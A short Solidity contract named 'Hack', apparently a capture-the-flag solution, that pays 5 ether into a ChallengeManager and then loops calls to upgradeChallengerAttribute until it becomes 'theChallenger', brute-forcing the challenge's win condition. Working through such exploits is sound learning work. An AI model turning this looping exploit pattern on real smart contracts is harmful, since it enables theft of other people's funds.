// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./ChallengeManager.sol";
import "./Privileged.sol";

contract Hack {
    Privileged public privileged;
    ChallengeManager public challengemanager;

    constructor(address _privileged, address _challengemanager){
        privileged = Privileged(_privileged);
        challengemanager = ChallengeManager(_challengemanager);
    }

    function approach() payable public {
        require(msg.value == 5 ether, "Need 5 Eth");
        challengemanager.approach{value: 5 ether}();
    }

    function setTheChallenger(uint _challengerId, uint _strangerId) public {
        while (challengemanager.theChallenger() != address(this)) 
        {
            challengemanager.upgradeChallengerAttribute(_challengerId, _strangerId);
        }

        require(challengemanager.theChallenger() == address(this), "Still not lucky");
    }

    function getChallenger(uint _id) public view returns(Privileged.casinoOwnerChallenger memory){
        return privileged.getRequirmenets(_id);
    }

    function getContractAddress() public view returns (address){
        return address(this);
    }

    function getTheChallenger() public view returns (address){
        return challengemanager.theChallenger();
    }
}